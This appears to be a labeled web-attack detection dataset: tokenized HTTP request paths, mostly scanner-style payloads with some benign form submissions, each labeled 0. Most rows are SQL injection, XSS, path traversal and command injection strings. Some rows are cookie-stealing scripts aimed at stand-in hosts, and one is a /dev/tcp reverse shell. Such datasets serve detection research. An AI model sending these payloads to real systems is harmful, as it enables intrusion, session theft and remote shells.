sentences 	 labels
/ examples / jsp / checkbox / lang / index . php ? file =  / etc / passwd  \r\n\r\n 	 0
/ recordings / admin / admin . php ? sid =  '  \r\n\r\n 	 0
/ javascript / test-cgi . exe  \r\n\r\n 	 0
/ examples / jsp / checkbox / blog . cgi ? submit = viewfile & month = 01 & year = 2004 & file =  | cat  / etc / passwd |  \r\n\r\n 	 0
/ string / modo = registro & login = emelia7 & password = e6u * ipolado & nombre = gelsomino & apellidos = medio + bullones & email = radzum_noriega @ alcantarapartners . hr & dni = 15508885p & direccion = c /  + cadernera ,  + 180 ,  + 5 ? c & ciudad = bveda & cp = 06360 & provincia = la + rioja & ntc = 3331042207803695sessionid = 12312312 &  + username =  < script > document . location =  ' http :  /  / hacker +  . example . com / cgi-bin / cookiesteal . cgi ?  '  +  + document . cookie <  / script >  & b1 = registrar  \r\n\r\n 	 0
/ string / modo = insertar & precio = 1972 & b1 = pasar + por + caja /  \r\n\r\n 	 0
/ string / strings / parameters = < svg 	onload	 = prompt ( 1 )  >  \r\n\r\n 	 0
/ n9xlumt5 . do ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 0
/ string / str =  $  ( echo rpjjib )   str1 =  $  {  # str }   if  [  1 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  &  \r\n\r\n 	 0
/ string / strings / parameters = 1 "  "  )  as tnux where 4888 = 4888 rlike  ( select  *  from  ( select ( sleep ( 5 )  )  ) vwyq )  #  \r\n\r\n 	 0
/ string / modo = entrar & login =  <  !  --  # include + file =  " archivo_secreto "  +  --  >  & pwd = juma & remember = on & b1 = entrar  \r\n\r\n 	 0
/ string / strings / parameters = 1 '  )  as xbsc where 6772 = 6772 ; waitfor delay  ' 0 : 0 : 5 '  --  \r\n\r\n 	 0
/ wamp_dir / setup / yesno . phtml ? no_url = xxpathxx ?  \r\n\r\n 	 0
/ jnv890lt . html ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 0
/ en-us / w4996nr0 . nsf ?  < script > document . cookie =  " testttvs = 7163 ;  "  <  / script >  \r\n\r\n 	 0
/ examples / jsp / jsp2 / el / javascript . php ? abs_path =  / etc / passwd \ x00  \r\n\r\n 	 0
/  /  /  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  { file }  \r\n\r\n 	 0
/ string / strings / parameters = 1 where 4985 = 4985 order by 1 #  \r\n\r\n 	 0
/ string / strings / parameters = 1 )  as rqac where 3381 = 3381 and 6240 =  (  ' qqpjq '  |  |  ( select case 6240 when 6240 then 1 else 0 end from rdb $ database )  |  |  ' qzvzq '  )  --  \r\n\r\n 	 0
/ string / strings / parameters = abc < div style =  " x :  \ x0cexpression ( javascript : alert ( 1 )  "  > def  \r\n\r\n 	 0
/ main . php ? stuff = ping ; -w ; 8000 ; -n ; 1 ; 4 . 3 . 2 . 1 | rem ;  \r\n\r\n 	 0
/ string / strings / parameters = -8636 "  "  )  )  )  union all select 1821 , 1821 , 1821 , 1821 , 1821 , 1821 , 1821 , 1821 , 1821 , 1821 --  \r\n\r\n 	 0
/ pfdispaly ?  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  \r\n\r\n 	 0
/ string / strings / parameters = "  ) print (  ` echo mohybu `  .  ` echo  $  (  ( 61 + 5 )  )  `  .  ` echo mohybu `  .  ` echo mohybu `  )  ;  \  \ mohybu  \r\n\r\n 	 0
/ cgi-bin / protection . php ? action = logout & siteurl =  / etc / passwd  \r\n\r\n 	 0
/ javascript / apac . exe  \r\n\r\n 	 0
/ string / strings / parameters = echo qcalon $  (  ( 95 + 41 )  )  $  ( echo qcalon ) qcalon |  \r\n\r\n 	 0
/ bin / windmail . exe ?  -n c :  \ boot . ini hacker @ hax0r . com  |  dir c :  \  \  \r\n\r\n 	 0
/ string / strings / parameters = ; echo $ ifsqsyggo $  (  ( 28 + 83 )  )  $  ( echo $ ifsqsyggo ) qsyggo &  \r\n\r\n 	 0
/ string / strings / parameters = |   [  7 -ne  $  ( echo yikkeu  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  |  \r\n\r\n 	 0
/ en-us / n9xlumt5 . jsp ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 0
/ recordings / apa_phpinclude . inc . php ? apa_module_basedir =  / etc / passwd \ x00  \r\n\r\n 	 0
/ 0x2e0x2e \ 0x2e0x2e \ 0x2e0x2e \ 0x2e0x2e \  { file }  \r\n\r\n 	 0
/ starnet / addons / slideshow_full . php ? album_name =  ' 524894511  \r\n\r\n 	 0
/ cgi-bin / smartsearch / smartsearch . cgi ? keywords =  |  / bin / cat  / etc / passwd |  \r\n\r\n 	 0
/  /  < body >  < script src = http :  /  / www . example . com / test ? rnd = q81315649 >  <  / script >  \r\n\r\n 	 0
/ string / strings / parameters = 1 '  )  as ihsc where 3978 = 3978 ; begin user_lock . sleep ( 5 )  ;  end --  \r\n\r\n 	 0
/ string / modo = registro & login = kuntova & password = ocenica '  + and +  ' 1 '  =  ' 1 & nombre = zuleika & apellidos = sasplug & email = bruian @ manjarr . is & dni = 67646420q & direccion = c /  + mineria + 92 + 2-b & ciudad = cabeza + de + bjar ,  + la & cp = 31180 & provincia = valencia & ntc = 8250386020996799 & b1 = registrar  \r\n\r\n 	 0
/ string / strings / parameters = 1 '  in boolean mode )  ; select sleep ( 5 )  #  \r\n\r\n 	 0
/ string / strings / parameters = < a href = http :  /  / foo . bar /  # x =  ` y >  <  / a >  < img alt =  "  `  >  < img src = x : x onerror = javascript : alert ( 1 )  >  <  / a >  "  >  \r\n\r\n 	 0
/ string / strings / parameters = -9289 )  )  or make_set ( 5101 = 9919 , 9919 )  and  (  ( 8977 = 8977  \r\n\r\n 	 0
/ string / strings / parameters = & lt ; a href =  \  " http &  # 58 ;  /  / 1113982867 /  \  "  & gt ; xss & lt ;  / a & gt ;  \r\n\r\n 	 0
/ string / strings / parameters = 1 )  )  ; select  ( case when  ( 6843 = 2657 )  then 6843 else 6843 *  ( select 6843 from information_schema . character_sets )  end )  #  \r\n\r\n 	 0
/ scripts / forum . php ? id_article = 1 & id_forum = -1 /  *  *  / union /  *  *  / select 1424302611 --  \r\n\r\n 	 0
/ forum1_professionnel . asp ? n = 1771 & amp ; nn = 100 & amp ; page =  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / boot . ini  \r\n\r\n 	 0
/ string / strings / parameters = 1 '  in boolean mode )  and 2006 = 2006  \r\n\r\n 	 0
/ en-us / 7o5qp766 . php ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 0
/ 6wb70v0b . jspa ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 0
/ string / strings / parameters = 1 "  "  )  )  and sleep ( 5 )  and  (  (  "  " lied "  "  like  "  " lied  \r\n\r\n 	 0
/ string / strings / parameters = 1 )  )  and row ( 6237 , 7469 )  >  ( select count (  *  )  , concat ( 0x7171706a71 ,  ( select  ( elt ( 6237 = 6237 , 1 )  )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  ) x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )  and  (  ( 9325 = 9325  \r\n\r\n 	 0
/ scripts / core / editor . php ? editor_insert_bottom =  / etc / passwd  \r\n\r\n 	 0
/ string / str =  $  ( echo shpkri )   str1 =  $  {  # str }   if  [  1 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  '  \r\n\r\n 	 0
/ string / strings / parameters = "  + style =  " x : expression ( alert ( 1 )  )  +  \r\n\r\n 	 0
/ scripts / home ? dir =  /  & file =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd & lang = kor  \r\n\r\n 	 0
/ string / strings / parameters = -4838 '  )  )  or 1 group by concat ( 0x7171706a71 ,  ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  )  having min ( 0 )  #  \r\n\r\n 	 0
/ en-us / account / admin / file_manager . php ? action = read & filename =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  \r\n\r\n 	 0
/ string / strings / parameters = 1 '  )  )  and row ( 6237 , 7469 )  >  ( select count (  *  )  , concat ( 0x7171706a71 ,  ( select  ( elt ( 6237 = 6237 , 1 )  )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  ) x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )  and  (  (  ' adnz '  =  ' adnz  \r\n\r\n 	 0
/ string / errormsg = credenciales + incorrectas ?  \r\n\r\n 	 0
/ string / strings / parameters = "  ; waitfor delay  ' 0 : 0 : __time__ '  --  \r\n\r\n 	 0
/ string / strings / parameters = <  ?  foo =  "  >  < x foo =  '  ?  >  < script > javascript : alert ( 1 )  <  / script >  '  >  "  >  \r\n\r\n 	 0
/ string / strings / parameters = 1 "  "  )  )  )  or  ( select 9173 from ( select count (  *  )  , concat ( 0x7171706a71 ,  ( select  ( elt ( 9173 = 9173 , 1 )  )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  ) x from information_schema . character_sets group by x ) a )  and  (  (  (  "  " oyxk "  "  =  "  " oyxk  \r\n\r\n 	 0
/ phpmyadmin / search . jsp ? q =  %  "  < script > alert ( 1331904373 )  <  / script >  \r\n\r\n 	 0
/  .  .  /  .  .  /  /  .  .  /  .  .  /  /  .  .  /  /  /  { file }  \r\n\r\n 	 0
/ javascript / gfx . exe  \r\n\r\n 	 0
/ string / strings / parameters = 1 %  "  "  )  )  )  ; create or replace function sleep ( int )  returns int as  '  / lib / libc . so . 6 '  ,  ' sleep '  language  ' c '  strict ;  select sleep ( 5 )  --  \r\n\r\n 	 0
/ string / strings / parameters = '  ;  str =  $  ( echo wsgiyr )  ;  str1 =  $  {  # str }  ;  if  [  2 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  '  \r\n\r\n 	 0
/ string / strings / parameters = 1 '  )  and row ( 6237 , 7469 )  >  ( select count (  *  )  , concat ( 0x7171706a71 ,  ( select  ( elt ( 6237 = 6237 , 1 )  )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  ) x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )  \r\n\r\n 	 0
/ n9xlumt5 . nsf ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 0
/ lsoix5h3 . dll ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 0
/ ht8pn8uq . kspx ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 0
/ string / strings / parameters = 1 '  )  )  as ylyq where 2953 = 2953 and 2716 =  ( select count (  *  )  from sysusers as sys1 , sysusers as sys2 , sysusers as sys3 , sysusers as sys4 , sysusers as sys5 , sysusers as sys6 , sysusers as sys7 )  --  \r\n\r\n 	 0
/ string / strings / parameters = |  | echo $ ifsjhthvw $  (  ( 39 + 26 )  )  $  ( echo $ ifsjhthvw ) jhthvw '  \r\n\r\n 	 0
/ string / strings / parameters = < meta http-equiv =  " refresh "  content =  " 0 ; javascript & colon ; alert ( 1 )  "  /  >  ?  \r\n\r\n 	 0
/ javascript / phps . exe  \r\n\r\n 	 0
/ edzaia0i . idc ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 0
/ v3axg1p8 . jsp ?  < meta http-equiv = set-cookie content =  " testxagh = 6987 "  >  \r\n\r\n 	 0
/ l13b77e5 . mscgi ?  < meta http-equiv = set-cookie content =  " testjvvf = 7721 "  >  \r\n\r\n 	 0
/ string / modo = registro & login = hormoz & password = 79ari68 & nombre = tamar & apellidos = unger & email = ferrandis @ ilusionarium . is & dni = 27110453p & direccion = c /  + tampa ,  + 34 +  & ciudad = molares ,  + los & cpa = 05410 & provincia = teruel & ntc = 7701457023954310 & b1 = registrar  \r\n\r\n 	 0
/ string / modo = entrar & login = kube9 & pwd = 38r20nve1e9 & remember = on /  & b1 = entrar  \r\n\r\n 	 0
/ scripts / modules / tinymce / content_css . php ? templateid = -1 /  *  *  / union /  *  *  / select /  *  *  / 1331919011 , 1 , 921952561 --  \r\n\r\n 	 0
/ string / strings / parameters = 1 "  "  )  where 1392 = 1392 procedure analyse ( extractvalue ( 5840 , concat ( 0x5c , 0x7171706a71 ,  ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end )  )  , 0x717a767a71 )  )  , 1 )  --  \r\n\r\n 	 0
/ examples / jsp / cal / starnet / modules / sn_allbum / slideshow . php ? cmsdir =  / etc / passwd \ x00  \r\n\r\n 	 0
/ string / strings / parameters = ' print (  ` echo kkqsra `  .  ` echo  $  (  ( 71 + 76 )  )  `  .  ` echo kkqsra `  .  ` echo kkqsra `  )  ;  # kkqsra  \r\n\r\n 	 0
/ string / strings / parameters = ( coalesce ( length ( load_file ( 0x2f6574632f706173737764 )  )  , 1 )  )  \r\n\r\n 	 0
/ index . php ? node = system & op = block < script > alert (  " wvs-xss-magic-string-413305588088 "  )  <  / script >  & block = 3 & bop = more  \r\n\r\n 	 0
/ string / strings / parameters = < div style =  " list-style : url ( http :  /  / foo . f )  \ 20url ( javascript : alert ( 1 )  )  ;  "  > x <  / div >  \r\n\r\n 	 0
/ javascript / dcforum . exe  \r\n\r\n 	 0
/ string / strings / parameters = 23 or 1 = 1  \r\n\r\n 	 0
/ javascript / customers . exe  \r\n\r\n 	 0
/ string / modo = entrarsessionid = 12312312 &  + username =  < script > document . location =  ' http :  /  / attackerhost . example / cgi-bin / cookiesteal . cgi ?  '  + document . cookie <  / s + cript >  ?  & login = sabry & pwd = ce8cuate & remember = off & b1 = entrar  \r\n\r\n 	 0
/ string / modo = registro <  !  --  # include + file =  " archivo_secreto "  +  --  >  & login = surreau & password = 2u1nt1 & nombre = najla & apellidos = matamalas + reixachs & email = egger . nardo @ quecole . sr & dni = 56569418k & direccion = pl .  + tres + olivos ,  + s / n + 1-f & ciudad = llber & cp = 26321 & provincia = guadalajara & ntc = 5185081374868942 & b1 = registrar  \r\n\r\n 	 0
/ examples / jsp / num / source ? v =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  \r\n\r\n 	 0
/ string / strings / parameters = "  |  | echo telpma $  (  ( 31 + 37 )  )  $  ( echo telpma ) telpma  \r\n\r\n 	 0
/ main . php ? stuff =  " ver ;  > q74579968 & rem ;  \r\n\r\n 	 0
/ main . php ? logout =  '  & uname \ x09 > q59435268 \ x09 #  \r\n\r\n 	 0
/ scripts / rest / api / 2 . 0 . alpha1 / serverinfo  \r\n\r\n 	 0
/ script / menu / menuprincipal . php ? path_inc = http :  /  / 192 . 168 . 202 . 96 : 8080 / 4dckqcc0acprbz ?  \r\n\r\n 	 0
/ odzk29aa . cgi ?  < script > document . cookie =  " testtfvh = 2141 ;  "  <  / script >  \r\n\r\n 	 0
/ string / strings / parameters = admin )  (  |  ( password =  *  )  \r\n\r\n 	 0
/ 169okeyj . aspx ?  < script > document . cookie =  " testxeoi = 3573 ;  "  <  / script >  \r\n\r\n 	 0
/ string / strings / parameters = 1 '  )  )  )  rlike  ( select  *  from  ( select ( sleep ( 5 )  )  ) sgvo )  and  (  (  (  ' wuux '  =  ' wuux  \r\n\r\n 	 0
/ unavailable . php ? bibtexrootrel = xxpathxx ?  \r\n\r\n 	 0
/ forum1_professionnel . asp ? n = 1771 & amp ; nn =  /  .  .  .  .  .  .  / boot . ini & amp ; page = 1  \r\n\r\n 	 0
/ string / strings / parameters = 1 %  '  )  )  and 8312 = dbms_pipe . receive_message ( chr ( 69 )  |  | chr ( 79 )  |  | chr ( 101 )  |  | chr ( 68 )  , 5 )  --  \r\n\r\n 	 0
/ string / strings / parameters = "  ;  str =  $  ( echo rnivnr )  ;  str1 =  $  {  # str }  ;  if  [  1 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  /  /  \r\n\r\n 	 0
/ string / strings / parameters = 1 )  and 2716 =  ( select count (  *  )  from sysusers as sys1 , sysusers as sys2 , sysusers as sys3 , sysusers as sys4 , sysusers as sys5 , sysusers as sys6 , sysusers as sys7 )  --  \r\n\r\n 	 0
/ string / strings / parameters = 1 "  "  where 4684 = 4684 union all select null , null , null , null #  \r\n\r\n 	 0
/ string / strings / parameters = 1 )  )  and 7533 = 7533 and  (  ( 8738 = 8738  \r\n\r\n 	 0
/ examples / jsp / jsp2 / jspx / auktion . cgi ? menue =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  \r\n\r\n 	 0
/ nyjgaorz . php3 ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 0
/ string / id = 1 & nombre = ques + o + manchego & precio = 85 & cantidad = 28 & b1 = aadir + al + carrito  \r\n\r\n 	 0
/ examples / jsp / sessions / direct . php ? rf =  / etc / passwd \ x00  \r\n\r\n 	 0
/ yef5f3d5 . dll ?  < meta http-equiv = set-cookie content =  " testcrcv = 6167 "  >  \r\n\r\n 	 0
/ zmvq66jy . nsf ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 0
/ string / strings / parameters = < script > x =  "  "  >  >  > prompt ( 9 )  >  >  >  "  "  ; y = 42 ;  <  / script >  \r\n\r\n 	 0
/ shops / sub . asp ? isub = dupaypal_sql_injections . nasl '  \r\n\r\n 	 0
/ string / strings / parameters = 1 "  "  ; iif ( 5257 = 5257 , 1 , 1 / 0 )  \r\n\r\n 	 0
/ components / com_joomlaboard / file_upload . php ? sbp = xxpathxx ?  \r\n\r\n 	 0
/ string / str =  $  ( echo dmzptc )   str1 =  $  {  # str }   if  [  3 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  |  \r\n\r\n 	 0
/ help . php ? q =  & ver  > q48647675 & rem  \r\n\r\n 	 0
/ d765w06j . kspx ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 0
/ string / modo = registro & login = erh-huan4 & password =  +  & nombre = basiana & apellidos = castany + bigorra & email = balsamo @ chicashumedas . aw & dni = 81192846v & direccion = urbanizacion + santo + domingo + de + la + calzada + 113 + 6h & ciudad = alberguera + de + argan ,  + la & cp = 22760 & provincia = segovia & ntc = 0768342745697395 & b1 = registrar  \r\n\r\n 	 0
/ scripts / lib . inc . php ? pm_path = http :  /  / xxxxxxxx & sfx =  . txt  \r\n\r\n 	 0
/ string / strings / parameters = 1 '  )  )  as oyad where 7161 = 7161 and 6240 =  (  ' qqpjq '  |  |  ( select case 6240 when 6240 then 1 else 0 end from rdb $ database )  |  |  ' qzvzq '  )  --  \r\n\r\n 	 0
/ 3hlysl2x . asp ?  < meta http-equiv = set-cookie content =  " testgjbe = 8505 "  >  \r\n\r\n 	 0
/ help . php ? q =  ' del q24159687  #  \r\n\r\n 	 0
/ view . php ? id = xxpathxx  \r\n\r\n 	 0
/ string / strings / parameters = '  ;  str =  $  ( echo tabifb )  ;  str1 =  $  {  # str }  ;  if  [  2 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  \  \  \r\n\r\n 	 0
/ u8yiqilu . exe ?  < script > document . cookie =  " testswjp = 6010 ;  "  <  / script >  \r\n\r\n 	 0
/ javascript / saved . exe  \r\n\r\n 	 0
/ manager / webappmon . exe ? ins = nowait & act = natping & sel =  " 255 . 255 . 255 . 255  &  id &  "  \r\n\r\n 	 0
/ string / id = 1 & nombre = vino + rioja & precio = 100 /  & cantidad = 19 & b1 = aadir + al + carrito  \r\n\r\n 	 0
/ string / strings / parameters = "  echo mjvqyb $  (  ( 44 + 28 )  )  $  ( echo mjvqyb ) mjvqyb "  \r\n\r\n 	 0
/ string / strings / parameters = 1 "  "  )  )  )  ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 )  |  | char ( 69 )  |  | char ( 83 )  , null )  , 0 )  , 500000000 )  , null )  else char ( 76 )  |  | char ( 65 )  |  | char ( 102 )  |  | char ( 72 )  end )  from  ( values ( 0 )  )  )  and  (  (  (  "  " fcpm "  "  =  "  " fcpm  \r\n\r\n 	 0
/ phpmyadmin / squirrelcart / cart_content . php ? cart_isp_root =  / etc / passwd \ x00  \r\n\r\n 	 0
/ tukodz3j . jsp ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 0
/ string / strings / parameters = ;  str =  $  ( echo otxvur )  ;  str1 =  $  {  # str }  ;  if  [  9 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  /  /  \r\n\r\n 	 0
/ examples / jsp / checkbox / am . pl ? path = bin / mozilla & action = display_form & file = users / etc / passwd & login = root + login  \r\n\r\n 	 0
/ string / modo =  ?  & precio = 5969 & b1 = confirmar  \r\n\r\n 	 0
/ examples / jsp / num / webcart . cgi ? config = mountain & change = yes & nextpage =  ; id |  & code = phold  \r\n\r\n 	 0
/ string / strings / parameters = 1 "  "  )  )  and 8407 =  ( select count (  *  )  from generate_series ( 1 , 5000000 )  )  and  (  (  "  " jydy "  "  like  "  " jydy  \r\n\r\n 	 0
/ cgi-sys / gw5 / gwweb . exe ? help = bad-request  \r\n\r\n 	 0
/ help . php ? q =  '  \ x0duname \ x09 > q24981853 \ x09 #  \r\n\r\n 	 0
/ examples / jsp / num / af . cgi ? _browser_out =  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  / etc / passwd  \r\n\r\n 	 0
/ qhvu0pdg . pl ?  < meta http-equiv = set-cookie content =  " testchuc = 2100 "  >  \r\n\r\n 	 0
/ twiki / bin / view / main / twikiusers ? rev = 87518  ` 0 <  & 152- ; exec 152 <  >  / dev / tcp / 192 . 168 . 202 . 96 / 22811 ; sh  <  & 152  >  & 152 2 >  & 152 `  #  \r\n\r\n 	 0
/ string / strings / parameters = -5062 )  where 7457 = 7457 or 4144 =  ( select upper ( xmltype ( chr ( 60 )  |  | chr ( 58 )  |  | chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  |  | chr ( 62 )  )  )  from dual )  --  \r\n\r\n 	 0
